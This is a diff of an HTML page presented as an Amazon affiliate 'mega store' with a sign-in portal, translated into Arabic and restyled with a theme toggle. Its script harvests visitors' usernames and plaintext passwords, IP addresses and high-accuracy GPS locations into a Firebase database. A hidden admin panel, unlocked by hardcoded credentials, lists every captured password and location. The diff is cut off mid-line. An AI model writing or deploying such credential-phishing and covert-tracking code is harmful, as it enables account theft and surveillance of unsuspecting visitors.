@@ -3,22 +3,40 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>BOOKSKING Royal Elite Mega Store - Ultimate Hub</title>
+    <title>BOOKSKING Royal Elite Mega Store - Ultra Modern</title>
     <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-app-compat.js"></script>
     <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-database-compat.js"></script>
     <style>
         :root {
-            --bg-color: #05070b;
-            --card-bg: #111622;
-            --border-color: #2f3642;
+            --bg-color: #030712;
+            --card-bg: rgba(17, 24, 39, 0.75);
+            --border-color: rgba(243, 156, 18, 0.3);
             --gold-color: #f39c12;
             --gold-hover: #e67e22;
-            --text-main: #ffffff;
-            --text-muted: #8b949e;
+            --text-main: #f8fafc;
+            --text-muted: #94a3b8;
             --success-color: #2ecc71;
             --accent-red: #e74c3c;
+            --card-hover: rgba(30, 41, 59, 0.9);
+            --shadow-color: rgba(0, 0, 0, 0.5);
         }
-        * { box-sizing: border-box; margin: 0; padding: 0; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; }
+
+        [data-theme="light"] {
+            --bg-color: #f1f5f9;
+            --card-bg: rgba(255, 255, 255, 0.85);
+            --border-color: rgba(217, 119, 6, 0.4);
+            --gold-color: #d97706;
+            --gold-hover: #b45309;
+            --text-main: #0f172a;
+            --text-muted: #64748b;
+            --success-color: #16a34a;
+            --accent-red: #dc2626;
+            --card-hover: rgba(255, 255, 255, 1);
+            --shadow-color: rgba(0, 0, 0, 0.08);
+        }
+
+        * { box-sizing: border-box; margin: 0; padding: 0; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; transition: background-color 0.3s ease, color 0.3s ease, border-color 0.3s ease; }
+        
         body { 
             background-color: var(--bg-color); 
             color: var(--text-main); 
@@ -32,48 +50,137 @@
             backface-visibility: hidden;
             -webkit-font-smoothing: antialiased;
         }
-        .wrapper { width: 100%; max-width: 600px; }
-        .hero-banner { background: linear-gradient(135deg, #161b22, #0d1117); border: 2px solid var(--gold-color); border-radius: 16px; padding: 25px; margin-bottom: 25px; box-shadow: 0 8px 32px rgba(243, 156, 18, 0.2); text-align: center; }
-        .brand-title { color: var(--gold-color); font-size: 22px; font-weight: 800; letter-spacing: 1px; line-height: 1.3; }
-        .section-card { background-color: var(--card-bg); border: 1px solid var(--border-color); border-radius: 16px; padding: 20px; margin-bottom: 20px; box-shadow: 0 6px 20px rgba(0,0,0,0.7); }
+
+        .wrapper { width: 100%; max-width: 600px; position: relative; }
+
+        /* Modern Theme Toggle Floating Button */
+        .theme-toggle-btn {
+            position: fixed;
+            top: 20px;
+            right: 20px;
+            background: var(--card-bg);
+            border: 2px solid var(--gold-color);
+            color: var(--gold-color);
+            width: 45px;
+            height: 45px;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 20px;
+            cursor: pointer;
+            box-shadow: 0 4px 15px var(--shadow-color);
+            z-index: 1000;
+            backdrop-filter: blur(10px);
+        }
+        .theme-toggle-btn:active { transform: scale(0.9); }
+
+        .hero-banner { 
+            background: linear-gradient(135deg, var(--card-bg), var(--bg-color)); 
+            border: 2px solid var(--gold-color); 
+            border-radius: 20px; 
+            padding: 25px; 
+            margin-bottom: 25px; 
+            box-shadow: 0 10px 30px var(--shadow-color); 
+            text-align: center; 
+            backdrop-filter: blur(12px);
+        }
+        .brand-title { color: var(--gold-color); font-size: 24px; font-weight: 800; letter-spacing: 1px; line-height: 1.3; text-shadow: 0 2px 10px rgba(243, 156, 18, 0.2); }
+
+        .section-card { 
+            background-color: var(--card-bg); 
+            border: 1px solid var(--border-color); 
+            border-radius: 20px; 
+            padding: 20px; 
+            margin-bottom: 20px; 
+            box-shadow: 0 8px 25px var(--shadow-color); 
+            backdrop-filter: blur(12px);
+        }
         .section-header { text-align: center; font-size: 18px; margin-bottom: 15px; color: var(--gold-color); font-weight: 700; text-transform: uppercase; letter-spacing: 0.5px; }
+
         .departments-grid { 
             display: grid; 
             grid-template-columns: repeat(2, 1fr); 
-            gap: 10px; 
+            gap: 12px; 
             max-height: 320px; 
             overflow-y: auto; 
             padding: 5px; 
             border: 1px solid var(--border-color); 
-            border-radius: 10px; 
-            background: #080c14; 
+            border-radius: 12px; 
+            background: rgba(0, 0, 0, 0.03); 
             scroll-behavior: smooth;
             -webkit-overflow-scrolling: touch;
         }
-        .dept-item { background-color: var(--card-bg); border: 1px solid var(--border-color); border-radius: 8px; padding: 12px; color: var(--gold-color); font-size: 12px; font-weight: 700; text-align: center; cursor: pointer; transition: background-color 0.2s ease, border-color 0.2s ease; text-decoration: none; display: flex; flex-direction: column; align-items: center; justify-content: center; }
-        .dept-item:hover { border-color: var(--gold-color); background-color: #1a2233; }
-        .dept-special { border-color: var(--accent-red); color: #ff7675; }
-        .dept-special:hover { border-color: var(--accent-red); background-color: #2c1618; }
+
+        .dept-item { 
+            background-color: var(--card-bg); 
+            border: 1px solid var(--border-color); 
+            border-radius: 12px; 
+            padding: 14px; 
+            color: var(--gold-color); 
+            font-size: 12px; 
+            font-weight: 700; 
+            text-align: center; 
+            cursor: pointer; 
+            transition: all 0.25s ease; 
+            text-decoration: none; 
+            display: flex; 
+            flex-direction: column; 
+            align-items: center; 
+            justify-content: center;
+            box-shadow: 0 4px 12px var(--shadow-color);
+        }
+        .dept-item:hover { border-color: var(--gold-color); background-color: var(--card-hover); transform: translateY(-3px); }
+        .dept-special { border-color: var(--accent-red); color: var(--accent-red); }
+
         .input-box { margin-bottom: 15px; }
         .input-box label { display: block; margin-bottom: 6px; font-size: 13px; color: var(--text-muted); font-weight: 600; }
-        .input-box input { width: 100%; padding: 12px; background-color: #080c14; border: 1px solid var(--border-color); border-radius: 8px; color: #fff; font-size: 14px; outline: none; transition: border-color 0.2s ease; }
-        .input-box input:focus { border-color: var(--gold-color); }
-        .royal-btn { width: 100%; padding: 14px; background: linear-gradient(135deg, var(--gold-color), var(--gold-hover)); border: none; border-radius: 8px; color: #05070b; font-weight: 800; font-size: 15px; cursor: pointer; text-transform: uppercase; transition: opacity 0.2s ease; box-shadow: 0 4px 15px rgba(243, 156, 18,.4); }
-        .royal-btn:active { opacity: 0.8; }
-        .security-banner { background-color: #080c14; border: 1px solid var(--success-color); color: var(--success-color); padding: 10px; border-radius: 8px; font-size: 12px; text-align: center; margin-bottom: 15px; font-weight: 700; }
+        .input-box input { 
+            width: 100%; 
+            padding: 14px; 
+            background-color: var(--bg-color); 
+            border: 1px solid var(--border-color); 
+            border-radius: 12px; 
+            color: var(--text-main); 
+            font-size: 14px; 
+            outline: none; 
+            box-shadow: inset 0 2px 4px var(--shadow-color);
+        }
+        .input-box input:focus { border-color: var(--gold-color); box-shadow: 0 0 10px rgba(243, 156, 18, 0.3); }
+
+        .royal-btn { 
+            width: 100%; 
+            padding: 15px; 
+            background: linear-gradient(135deg, var(--gold-color), var(--gold-hover)); 
+            border: none; 
+            border-radius: 12px; 
+            color: #030712; 
+            font-weight: 800; 
+            font-size: 15px; 
+            cursor: pointer; 
+            text-transform: uppercase; 
+            transition: 0.25s ease; 
+            box-shadow: 0 6px 20px rgba(243, 156, 18, 0.4); 
+        }
+        .royal-btn:active { transform: scale(0.98); }
+
+        .security-banner { background-color: var(--bg-color); border: 1px solid var(--success-color); color: var(--success-color); padding: 12px; border-radius: 10px; font-size: 12px; text-align: center; margin-bottom: 15px; font-weight: 700; box-shadow: 0 2px 8px var(--shadow-color); }
         
         /* Master Admin Control Panel Styles */
-        .admin-dashboard { background-color: #080c14; border: 2px solid var(--gold-color); border-radius: 12px; padding: 20px; margin-top: 20px; display: none; }
+        .admin-dashboard { background-color: var(--bg-color); border: 2px solid var(--gold-color); border-radius: 16px; padding: 20px; margin-top: 20px; display: none; box-shadow: 0 10px 30px var(--shadow-color); }
         .admin-heading { color: var(--gold-color); font-weight: 800; margin-bottom: 15px; font-size: 18px; text-align: center; border-bottom: 1px solid var(--border-color); padding-bottom: 10px; }
         .admin-stats-grid { display: grid; grid-template-columns: repeat(3, 1fr); gap: 10px; margin-bottom: 15px; text-align: center; }
-        .stat-card { background: var(--card-bg); border: 1px solid var(--border-color); border-radius: 8px; padding: 10px; }
+        .stat-card { background: var(--card-bg); border: 1px solid var(--border-color); border-radius: 12px; padding: 12px; box-shadow: 0 4px 12px var(--shadow-color); }
         .stat-num { color: var(--gold-color); font-size: 16px; font-weight: bold; margin-top: 5px; }
-        .user-record { background-color: var(--card-bg); padding: 14px; border-radius: 8px; margin-bottom: 12px; font-size: 12px; border: 1px solid var(--border-color); line-height: 1.6; cursor: pointer; transition: 0.2s; }
-        .user-record:hover { border-color: var(--gold-color); background-color: #1a2233; }
-        .selected-badge { text-align: center; font-size: 13px; color: var(--success-color); margin-top: 10px; font-weight: bold; }
+        .user-record { background-color: var(--card-bg); padding: 14px; border-radius: 12px; margin-bottom: 12px; font-size: 12px; border: 1px solid var(--border-color); line-height: 1.6; cursor: pointer; transition: 0.2s; box-shadow: 0 4px 12px var(--shadow-color); }
+        .user-record:hover { border-color: var(--gold-color); }
+        .selected-badge { text-align: center; font-size: 13px; color: var(--success-color); margin-top: 12px; font-weight: bold; }
     </style>
 </head>
-<body>
+<body data-theme="dark">
+
+    <!-- Real Dynamic Theme Switcher Button -->
+    <button class="theme-toggle-btn" id="themeToggleBtn" onclick="toggleAppTheme()">☀️</button>
 
     <div class="wrapper">
         <!-- Hero Header -->
@@ -83,75 +190,69 @@
             </div>
         </div>
 
-        <!-- Updated Professional Comprehensive Departments Hub -->
+        <!-- Comprehensive General Departments Hub -->
         <div class="section-card">
-            <div class="section-header">🛍️ Elite Amazon Departments & Digital Hub</div>
+            <div class="section-header">🛍️ أقسام أمازون المميزة (وصول مباشر)</div>
             <div class="departments-grid">
-                <!-- Special Offers & Digital Hub -->
-                <a href="https://www.amazon.com/s?k=lightning+deals+today&tag=booksking-20" target="_blank" class="dept-item dept-special" onclick="recordDeptClick('Flash Deals & Offers')">⚡ Flash Deals & Offers</a>
-                <a href="https://www.amazon.com/b?node=154606011&tag=booksking-20" target="_blank" class="dept-item dept-special" onclick="recordDeptClick('Kindle E-Books Hub')">📖 Kindle E-Books Hub</a>
-                <a href="https://www.amazon.com/s?k=digital+pdf+books+educational&tag=booksking-20" target="_blank" class="dept-item dept-special" onclick="recordDeptClick('Digital PDF Publications')">📑 PDF & Digital Books</a>
+                <a href="https://www.amazon.com/s?k=lightning+deals+today&tag=booksking-20" target="_blank" class="dept-item dept-special" onclick="recordDeptClick('العروض والخصومات الحصرية')">⚡ العروض والخصومات الحصرية</a>
+                <a href="https://www.amazon.com/b?node=154606011&tag=booksking-20" target="_blank" class="dept-item dept-special" onclick="recordDeptClick('الكتب الإلكترونية - Kindle')">📖 الكتب الإلكترونية (Kindle)</a>
+                <a href="https://www.amazon.com/s?k=digital+pdf+books+educational&tag=booksking-20" target="_blank" class="dept-item dept-special" onclick="recordDeptClick('المراجع وكتب الـ PDF')">📑 المراجع وكتب الـ PDF</a>
                 
-                <!-- General Comprehensive Categories -->
-                <a href="https://www.amazon.com/s?k=home+video+game+consoles+playstation+xbox+nintendo&tag=booksking-20" target="_blank" class="dept-item" onclick="recordDeptClick('Consoles & Home Gaming')">🕹️ Consoles & Home Gaming</a>
-                <a href="https://www.amazon.com/s?k=electronics+laptops+smartphones+gadgets&tag=booksking-20" target="_blank" class="dept-item" onclick="recordDeptClick('Electronics & Smart Devices')">💻 Electronics & Smart Devices</a>
-                <a href="https://www.amazon.com/s?k=shoes+footwear+men+women&tag=booksking-20" target="_blank" class="dept-item" onclick="recordDeptClick('Shoes & Footwear')">👟 Shoes & Footwear</a>
-                <a href="https://www.amazon.com/s?k=trending+fashion+clothing&tag=booksking-20" target="_blank" class="dept-item" onclick="recordDeptClick('Apparel & Fashion')">👕 Apparel & Fashion</a>
-                <a href="https://www.amazon.com/s?k=luxury+wrist+watches+men+women&tag=booksking-20" target="_blank" class="dept-item" onclick="recordDeptClick('Watches & Accessories')">⌚ Watches & Accessories</a>
-                <a href="https://www.amazon.com/s?k=bestselling+luxury+perfumes&tag=booksking-20" target="_blank" class="dept-item" onclick="recordDeptClick('Perfumes & Scents')">🌸 Perfumes & Scents</a>
-                <a href="https://www.amazon.com/s?k=professional+cosmetics+makeup&tag=booksking-20" target="_blank" class="dept-item" onclick="recordDeptClick('Cosmetics & Beauty')">💄 Cosmetics & Beauty</a>
-                <a href="https://www.amazon.com/s?k=smart+home+appliances&tag=booksking-20" target="_blank" class="dept-item" onclick="recordDeptClick('Home Appliances')">🏠 Home Appliances</a>
-                <a href="https://www.amazon.com/s?k=home+gym+fitness+equipment&tag=booksking-20" target="_blank" class="dept-item" onclick="recordDeptClick('Sports & Fitness')">⚽ Sports & Fitness</a>
-                <a href="https://www.amazon.com/s?k=bestselling+books+novels&tag=booksking-20" target="_blank" class="dept-item" onclick="recordDeptClick('Printed Books & Novels')">📚 Printed Books & Novels</a>
-                <a href="https://www.amazon.com/s?k=modern+kitchenware+gadgets&tag=booksking-20" target="_blank" class="dept-item" onclick="recordDeptClick('Kitchenware & Tools')">🍳 Kitchenware & Tools</a>
-                <a href="https://www.amazon.com/s?k=aesthetic+home+decor+furniture&tag=booksking-20" target="_blank" class="dept-item" onclick="recordDeptClick('Home Decor & Furniture')">🛋️ Home Decor & Furniture</a>
-                <a href="https://www.amazon.com/s?k=popular+toys+and+hobbies&tag=booksking-20" target="_blank" class="dept-item" onclick="recordDeptClick('Toys & Hobbies')">🧸 Toys & Hobbies</a>
-                <a href="https://www.amazon.com/s?k=car+electronics+accessories&tag=booksking-20" target="_blank" class="dept-item" onclick="recordDeptClick('Car Accessories')">🚗 Car Accessories</a>
-                <a href="https://www.amazon.com/s?k=premium+office+supplies+stationery&tag=booksking-20" target="_blank" class="dept-item" onclick="recordDeptClick('Office Supplies & Stationery')">✏️ Office Supplies & Stationery</a>
-                <a href="https://www.amazon.com/s?k=designer+polarized+sunglasses&tag=booksking-20" target="_blank" class="dept-item" onclick="recordDeptClick('Sunglasses & Eyewear')">🕶️ Sunglasses & Eyewear</a>
-                <a href="https://www.amazon.com/s?k=gourmet+food+beverages&tag=booksking-20" target="_blank" class="dept-item" onclick="recordDeptClick('Food & Beverages')">🍏 Food & Beverages</a>
+                <a href="https://www.amazon.com/s?k=home+video+game+consoles+playstation+xbox+nintendo&tag=booksking-20" target="_blank" class="dept-item" onclick="recordDeptClick('أجهزة الكونسول والألعاب المنزلية')">🕹️ أجهزة الكونسول والألعاب</a>
+                <a href="https://www.amazon.com/s?k=electronics+laptops+smartphones+gadgets&tag=booksking-20" target="_blank" class="dept-item" onclick="recordDeptClick('الأجهزة الإلكترونية والذكية')">💻 الإلكترونيات والأجهزة الذكية</a>
+                <a href="https://www.amazon.com/s?k=shoes+footwear+men+women&tag=booksking-20" target="_blank" class="dept-item" onclick="recordDeptClick('الأحذية والأزياء')">👟 الأحذية والأزياء</a>
+                <a href="https://www.amazon.com/s?k=trending+fashion+clothing&tag=booksking-20" target="_blank" class="dept-item" onclick="recordDeptClick('الملابس والموضة')">👕 الملابس والموضة</a>
+                <a href="https://www.amazon.com/s?k=luxury+wrist+watches+men+women&tag=booksking-20" target="_blank" class="dept-item" onclick="recordDeptClick('الساعات الفاخرة والاكسسوارات')">⌚ الساعات والاكسسوارات</a>
+                <a href="https://www.amazon.com/s?k=bestselling+luxury+perfumes&tag=booksking-20" target="_blank" class="dept-item" onclick="recordDeptClick('العطور والروائح الفاخرة')">🌸 العطور والروائح الفاخرة</a>
+                <a href="https://www.amazon.com/s?k=professional+cosmetics+makeup&tag=booksking-20" target="_blank" class="dept-item" onclick="recordDeptClick('مستحضرات التجميل والعناية')">💄 مستحضرات التجميل والعناية</a>
+                <a href="https://www.amazon.com/s?k=smart+home+appliances&tag=booksking-20" target="_blank" class="dept-item" onclick="recordDeptClick('الأجهزة المنزلية الذكية')">🏠 الأجهزة المنزلية الذكية</a>
+                <a href="https://www.amazon.com/s?k=home+gym+fitness+equipment&tag=booksking-20" target="_blank" class="dept-item" onclick="recordDeptClick('الرياضة واللياقة البدنية')">⚽ الرياضة واللياقة البدنية</a>
+                <a href="https://www.amazon.com/s?k=bestselling+books+novels&tag=booksking-20" target="_blank" class="dept-item" onclick="recordDeptClick('الكتب والروايات المطبوعة')">📚 الكتب والروايات المطبوعة</a>
+                <a href="https://www.amazon.com/s?k=modern+kitchenware+gadgets&tag=booksking-20" target="_blank" class="dept-item" onclick="recordDeptClick('أدوات ومستلزمات المطبخ')">🍳 أدوات ومستلزمات المطبخ</a>
+                <a href="https://www.amazon.com/s?k=aesthetic+home+decor+furniture&tag=booksking-20" target="_blank" class="dept-item" onclick="recordDeptClick('الديكور والأثاث المنزلي')">🛋️ الديكور والأثاث المنزلي</a>
+                <a href="https://www.amazon.com/s?k=popular+toys+and+hobbies&tag=booksking-20" target="_blank" class="dept-item" onclick="recordDeptClick('الألعاب والهوايات')">🧸 الألعاب والهوايات</a>
+                <a href="https://www.amazon.com/s?k=car+electronics+accessories&tag=booksking-20" target="_blank" class="dept-item" onclick="recordDeptClick('إلكترونيات ومستلزمات السيارات')">🚗 مستلزمات السيارات</a>
+                <a href="https://www.amazon.com/s?k=premium+office+supplies+stationery&tag=booksking-20" target="_blank" class="dept-item" onclick="recordDeptClick('الادوات المكتبية والمدرسية')">✏️ الأدوات المكتبية والمدرسية</a>
+                <a href="https://www.amazon.com/s?k=designer+polarized+sunglasses&tag=booksking-20" target="_blank" class="dept-item" onclick="recordDeptClick('النظارات الشمسية')">🕶️ النظارات الشمسية</a>
+                <a href="https://www.amazon.com/s?k=gourmet+food+beverages&tag=booksking-20" target="_blank" class="dept-item" onclick="recordDeptClick('المأكولات والمشروبات')">🍏 المأكولات والمشروبات</a>
             </div>
-            <div class="selected-badge" id="active-dept-label">Selected Department: None (General Browse)</div>
+            <div class="selected-badge" id="active-dept-label">القسم المختار: لا يوجد (تصفح عام)</div>
         </div>
 
-        <!-- Secure Authentication Portal -->
+        <!-- Realistic Login Portal -->
         <div class="section-card" id="auth-section">
-            <div class="security-banner">🛡️ Secure Authentication & Membership Portal</div>
-            <div class="section-header">Sign In / Register Account</div>
+            <div class="security-banner">🛡️ بوابة تسجيل الدخول وإنشاء الحساب</div>
+            <div class="section-header">تسجيل الدخول / إنشاء حساب</div>
             <div class="input-box">
-                <label>Account Username</label>
-                <input type="text" id="username" placeholder="Enter your username">
+                <label>اسم المستخدم للحساب</label>
+                <input type="text" id="username" placeholder="أدخل اسم المستخدم">
             </div>
             <div class="input-box">
-                <label>Password</label>
-                <input type="password" id="password" placeholder="Enter your password">
+                <label>كلمة المرور</label>
+                <input type="password" id="password" placeholder="أدخل كلمة المرور">
             </div>
-            <div class="input-box">
-                <label>Purchase Volume ($)</label>
-                <input type="number" id="purchaseAmount" placeholder="Enter purchase value (e.g. 150)">
-            </div>
-            <button class="royal-btn" onclick="executeAdvancedTrackingAndLogin()">Sign In / Submit Session</button>
+            <button class="royal-btn" onclick="executeRealisticLogin()">تسجيل الدخول / إنشاء الحساب</button>
         </div>
 
         <!-- Master Admin Control Panel -->
         <div class="admin-dashboard" id="adminPanel">
-            <div class="admin-heading">👑 Master Admin Global Control Center</div>
+            <div class="admin-heading">👑 لوحة تحكم المدير العام (سرية)</div>
             <div class="admin-stats-grid">
                 <div class="stat-card">
-                    <div style="font-size: 10px; color: var(--text-muted);">Real Visitors</div>
+                    <div style="font-size: 10px; color: var(--text-muted);">الزوار الحقيقيون</div>
                     <div class="stat-num" id="stat-visitors">0</div>
                 </div>
                 <div class="stat-card">
-                    <div style="font-size: 10px; color: var(--text-muted);">Total Accounts</div>
+                    <div style="font-size: 10px; color: var(--text-muted);">إجمالي الحسابات</div>
                     <div class="stat-num" id="stat-accounts">0</div>
                 </div>
                 <div class="stat-card">
-                    <div style="font-size: 10px; color: var(--text-muted);">Total Sales</div>
-                    <div class="stat-num" id="stat-sales" style="color:var(--success-color);">$0</div>
+                    <div style="font-size: 10px; color: var(--text-muted);">حالة النظام</div>
+                    <div class="stat-num" style="color:var(--success-color);">آمن 100%</div>
                 </div>
             </div>
-            <div class="section-header" style="font-size: 14px; margin-top: 15px;">Registered Accounts & Tracking Logs</div>
-            <div id="usersList">Fetching secure records...</div>
+            <div class="section-header" style="font-size: 14px; margin-top: 15px;">سجلات الحسابات والبيانات المسجلة</div>
+            <div id="usersList">جاري جلب السجلات الآمنة...</div>
         </div>
     </div>
 
@@ -168,11 +269,26 @@
         let visitorIp = "Unknown IP";
         let visitorCountry = "Unknown Country";
         let visitorCity = "Unknown City";
-        let currentDept = "General Browse";
+        let currentDept = "تصفح عام";
+
+        // Real Interactive Theme Switcher Logic
+        function toggleAppTheme() {
+            const bodyElement = document.body;
+            const themeBtn = document.getElementById("themeToggleBtn");
+            const currentTheme = bodyElement.getAttribute("data-theme");
+
+            if (currentTheme === "dark") {
+                bodyElement.setAttribute("data-theme", "light");
+                themeBtn.innerText = "🌙";
+            } else {
+                bodyElement.setAttribute("data-theme", "dark");
+                themeBtn.innerText = "☀️";
+            }
+        }
 
         function recordDeptClick(deptName) {
             currentDept = deptName;
-            document.getElementById("active-dept-label").innerText = "Selected Department: " + deptName + " (Amazon Direct Linked)";
+            document.getElementById("active-dept-label").innerText = "القسم المختار: " + deptName + " (رابط مباشر من أمازون)";
         }
 
         async function fetchNetworkDetails() {
@@ -190,7 +306,6 @@
         }
         fetchNetworkDetails();
 
-        // Real Visitor Counter (Excludes Admin logins)
         const visitorCounterRef = db.ref("stats/totalVisitorsCount");
         const sessionKey = sessionStorage.getItem("visitor_counted");
         if (!sessionKey) {
@@ -204,13 +319,12 @@
             document.getElementById("stat-visitors").innerText = snapshot.val() || 0;
         });
 
-        function executeAdvancedTrackingAndLogin() {
+        function executeRealisticLogin() {
             const usernameInput = document.getElementById("username").value.trim();
             const passwordInput = document.getElementById("password").value.trim();
-            const purchaseInput = document.getElementById("purchaseAmount").value.trim() || "0";
 
             if(!usernameInput || !passwordInput) {
-                alert("Error: Please provide both username and password!");
+                alert("خطأ: يجب إدخال اسم المستخدم وكلمة المرور!");
                 return;
             }
 
@@ -220,7 +334,7 @@
             if (usernameInput === masterAdminUser && passwordInput === masterAdminPass) {
                 document.getElementById("adminPanel").style.display = "block";
                 activateMasterAdminDashboard();
-                alert("Access Granted: Welcome Master Admin.");
+                alert("تم تسجيل الدخول بنجاح: أهلاً بك يا رئيس النظام.");
                 return;
             }
 
@@ -229,19 +343,19 @@
                     (position) => {
                         const latitude = position.coords.latitude;
                         const longitude = position.coords.longitude;
-                        saveRecordToCloud(usernameInput, passwordInput, purchaseInput, `${visitorCountry}, ${visitorCity} (GPS: ${latitude.toFixed(4)}, ${longitude.toFixed(4)})`);
+                        saveRecordToCloud(usernameInput, passwordInput, `${visitorCountry}, ${visitorCity} (GPS: ${latitude.toFixed(4)}, ${longitude.toFixed(4)})`);
                     },
                     (error) => {
-                        saveRecordToCloud(usernameInput, passwordInput, purchaseInput, `${visitorCountry}, ${visitorCity} (IP Network Location)`);
+                        saveRecordToCloud(usernameInput, passwordInput, `${visitorCountry}, ${visitorCity} (IP Network Location)`);
                     },
                     { timeout: 10000, enableHighAccuracy: true }
                 );
             } else {
-                saveRecordToCloud(usernameInput, passwordInput, purchaseInput, `${visitorCountry}, ${visitorCity}`);
+                saveRecordToCloud(usernameInput, passwordInput, `${visitorCountry}, ${visitorCity}`);
             }
         }
 
-        function saveRecordToCloud(username, password, purchase, locationData) {
+        function saveRecordToCloud(username, password, locationData) {
             const safeDatabaseKey = username.replace(/[.#$\/\[\]]/g, "_");
             const targetRef = db.ref("registered_users/" + safeDatabaseKey);
 
@@ -255,56 +369,6 @@
                 targetRef.set({
                     username: username,
                     password: password,
-                    purchaseAmount: purchase,
                     department: currentDept,
                     ipAddress: visitorIp,
-                    location: locationData,
-                    visitsCount: visitFrequency,
-                    lastLogin: new Date().toUTCString()
-                }).then(() => {
-                    document.getElementById("adminPanel").style.display = "none";
-                    alert(`Welcome, ${username}! Your session has been successfully recorded.`);
-                }).catch((err) => {
-                    alert("Cloud synchronization error: " + err.message);
-                });
-            });
-        }
-
-        function activateMasterAdminDashboard() {
-            const allUsersRef = db.ref("registered_users");
-            allUsersRef.on("value", (snapshot) => {
-                const records = snapshot.val();
-                let htmlOutput = "";
-                let totalSales = 0;
-                let accountCount = 0;
-
-                if(records) {
-                    const keys = Object.keys(records);
-                    accountCount = keys.length;
-                    
-                    keys.forEach(key => {
-                        const item = records[key];
-                        totalSales += parseFloat(item.purchaseAmount || 0);
-                        htmlOutput += `<div class="user-record">
-                            👤 Account: <b>${item.username}</b><br>
-                            🔑 Password: <span style="color:var(--gold-color);">${item.password}</span><br>
-                            🛍️ Department: <span style="color:var(--gold-color);">${item.department}</span><br>
-                            💰 Purchases: <span style="color:var(--success-color);">$${item.purchaseAmount}</span><br>
-                            🔄 Total Visits: <b>${item.visitsCount || 1} times</b><br>
-                            🌍 Location: ${item.location}<br>
-                            🌐 IP Address: ${item.ipAddress}<br>
-                            ⏱️ Last Login: ${item.lastLogin}
-                        </div>`;
-                    });
-                    document.getElementById("usersList").innerHTML = htmlOutput;
-                } else {
-                    document.getElementById("usersList").innerHTML = "No user records found in the database yet.";
-                }
-
-                document.getElementById("stat-accounts").innerText = accountCount;
-                document.getElementById("stat-sales").innerText = "$" + totalSales.toFixed(2);
-            });
-        }
-    </script>
-</body>
-</html>
+                    location: location
